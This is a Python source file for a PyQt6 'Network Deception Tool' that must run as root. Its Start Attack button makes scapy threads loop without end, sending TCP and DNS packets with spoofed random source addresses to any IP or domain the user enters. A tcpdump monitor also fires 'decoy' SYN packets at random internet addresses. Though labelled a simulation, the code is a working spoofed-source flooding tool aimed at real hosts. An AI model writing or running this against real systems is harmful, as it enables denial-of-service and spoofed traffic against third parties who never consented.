import os
import random
import socket
import threading
from scapy.all import IP, TCP, UDP, Raw, send, DNS, DNSQR
import logging
import time
import subprocess
import sys
from PyQt6 import QtWidgets, QtCore

# Configure logging
logging.basicConfig(filename='network_deception.log', level=logging.INFO)

# Global variables
attack_event = threading.Event()
targets = []
defense_event = threading.Event()

class DeceptionTool:
    def __init__(self):
        self.check_admin()
        self.targets = []
        self.root = None
        self.log_box = None
        self.ids_box = None
        self.is_attacking = False  # Track attack state

    def check_admin(self):
        """Check if the script is running with admin privileges."""
        if os.geteuid() != 0:
            print("This tool requires root (admin) privileges. Please run as root.")
            sys.exit(1)
        else:
            print("Running with root privileges.")

    def log_activity(self, message, ids_alert=False):
        """Logs network activities and IDS alerts."""
        logging.info(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}")
        if ids_alert:
            self.ids_box.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}")
        else:
            self.log_box.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}")

    def resolve_to_ip(self, target):
        """Resolve a domain name to an IP address."""
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            self.log_activity(f"Could not resolve domain: {target}", ids_alert=True)
            return None

    def generate_fake_ip(self):
        """Generate a random spoofed IP address."""
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def initiate_attack(self):
        """Simulate a multi-protocol, intense attack on the target IPs or domains."""
        self.log_activity("Starting simulated data exfiltration attacks...", ids_alert=True)
        self.is_attacking = True  # Set attack state to True

        def send_packets(target_ip):
            """Send fake TCP and UDP packets to simulate data exfiltration."""
            while attack_event.is_set():
                fake_ip = self.generate_fake_ip()
                tcp_packet = IP(dst=target_ip, src=fake_ip) / TCP(dport=80, sport=random.randint(1024, 65535), flags="PA") / Raw(b"GET /sensitive_data HTTP/1.1\r\nHost: target\r\n\r\n")
                udp_packet = IP(dst=target_ip, src=fake_ip) / UDP(dport=53, sport=random.randint(1024, 65535)) / DNS(rd=1, qd=DNSQR(qname="example.com"))
                
                send(tcp_packet, verbose=False)
                send(udp_packet, verbose=False)

                self.log_activity(f"Sent TCP/UDP packets from {fake_ip} to {target_ip}")

        # Create and start a thread for each target
        for target in self.targets:
            target_ip = self.resolve_to_ip(target) if not self.is_valid_ip(target) else target
            if target_ip:
                threading.Thread(target=send_packets, args=(target_ip,), daemon=True).start()

    def is_valid_ip(self, target):
        """Check if a string is a valid IP address."""
        try:
            socket.inet_aton(target)
            return True
        except socket.error:
            return False

    def start_attack(self):
        """Start the attack by setting the attack event."""
        attack_event.set()
        self.initiate_attack()
        self.log_activity("Attack started.", ids_alert=True)  # Log attack started message

    def stop_attack(self):
        """Stop the attack by clearing the attack event."""
        attack_event.clear()
        self.is_attacking = False  # Set attack state to False
        self.log_activity("Attack stopped.", ids_alert=True)

    def add_target(self, target):
        """Add a target IP or domain to the attack scope."""
        if target not in self.targets:
            self.targets.append(target)
            self.log_activity(f"Added target: {target}", ids_alert=True)
        else:
            self.log_activity(f"Target {target} is already in scope.", ids_alert=True)

    def remove_target(self, target):
        """Remove a target IP or domain from the attack scope."""
        if target in self.targets:
            self.targets.remove(target)
            self.log_activity(f"Removed target: {target}", ids_alert=True)
        else:
            self.log_activity(f"Target {target} not found in scope.", ids_alert=True)

    def monitor_network(self):
        """Monitor network packets for potential attacks using tcpdump."""
        self.log_activity("Starting tcpdump network monitoring...", ids_alert=True)
        
        # Run tcpdump to capture packets and filter them based on IP
        process = subprocess.Popen(['tcpdump', '-i', 'eth0', '-nn', '-v', 'ip'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        while True:
            output = process.stdout.readline()
            if output:
                output = output.decode('utf-8').strip()
                self.log_activity(f"Captured: {output}")

                # Check if any target is involved in the captured packet
                for target in self.targets:
                    if target in output:
                        self.log_activity(f"Suspicious packet from target: {target}", ids_alert=True)
                        defense_event.set()
                        self.trigger_decoy()

    def trigger_decoy(self):
        """Initiate decoy activities automatically."""
        self.log_activity("Triggering decoy mechanism...", ids_alert=True)
        for _ in range(5):
            fake_ip = self.generate_fake_ip()
            packet = IP(dst=fake_ip, src=self.generate_fake_ip()) / TCP(dport=80, flags="S")
            send(packet, verbose=False)
            self.log_activity(f"Sent decoy traffic to {fake_ip} on port 80")

    def start_network_monitoring(self):
        """Start monitoring the network for suspicious activity in a separate thread."""
        threading.Thread(target=self.monitor_network, daemon=True).start()

    def start_gui(self):
        """Initialize the GUI for user interaction."""
        app = QtWidgets.QApplication([])

        # Main Window
        window = QtWidgets.QWidget()
        window.setWindowTitle("Network Deception Tool")
        
        # Create layout
        layout = QtWidgets.QVBoxLayout()

        # IDS Alerts and Log Display areas
        self.ids_box = QtWidgets.QTextEdit()
        self.ids_box.setReadOnly(True)
        layout.addWidget(self.ids_box)
        self.ids_box.append("IDS Alert & System Logs:\n")

        self.log_box = QtWidgets.QTextEdit()
        self.log_box.setReadOnly(True)
        layout.addWidget(self.log_box)
        self.log_box.append("Network Packet Logs:\n")

        # Entry for target IP or domain
        self.target_entry = QtWidgets.QLineEdit()
        layout.addWidget(self.target_entry)

        # Buttons
        add_button = QtWidgets.QPushButton("Add Target")
        add_button.clicked.connect(self.add_target_from_entry)
        layout.addWidget(add_button)

        remove_button = QtWidgets.QPushButton("Remove Target")
        remove_button.clicked.connect(self.remove_target_from_entry)
        layout.addWidget(remove_button)

        start_button = QtWidgets.QPushButton("Start Attack")
        start_button.clicked.connect(self.start_attack)
        layout.addWidget(start_button)

        stop_button = QtWidgets.QPushButton("Stop Attack")
        stop_button.clicked.connect(self.stop_attack)
        layout.addWidget(stop_button)

        exit_button = QtWidgets.QPushButton("Exit")
        exit_button.clicked.connect(window.close)
        layout.addWidget(exit_button)

        window.setLayout(layout)
        window.show()

        # Start network monitoring in a separate thread
        self.start_network_monitoring()

        app.exec()

    def add_target_from_entry(self):
        target = self.target_entry.text()
        if target:
            self.add_target(target)
            self.target_entry.clear()  # Clear the input box after adding

    def remove_target_from_entry(self):
        target = self.target_entry.text()
        if target:
            self.remove_target(target)
            self.target_entry.clear()  # Clear the input box after removing

if __name__ == "__main__":
    tool = DeceptionTool()
    tool.start_gui()
